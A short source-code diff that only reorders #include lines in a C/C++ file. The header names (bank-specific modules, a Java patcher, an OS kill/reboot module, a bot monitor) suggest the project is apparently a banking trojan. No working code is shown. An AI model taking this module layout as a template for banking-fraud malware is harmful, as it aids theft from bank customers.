@@ -40,6 +40,7 @@
 #include "Sber.h"
 
 #include "java_patcher.h"
+#include "JavaConfig.h"
 
 #include "KillOs_Reboot.h"
 #include "BBSCBank.h"
@@ -50,10 +51,13 @@
 
 
 #include "IBankSystem.h"
-#include "JavaConfig.h"
 #include "avangard.h"
 
 //#include "yandex.h"
+
+
+
+//#include "BotMonitor.h"
 
 #ifdef  DEBUGCONFIG
 	#include "BotMonitor.h"
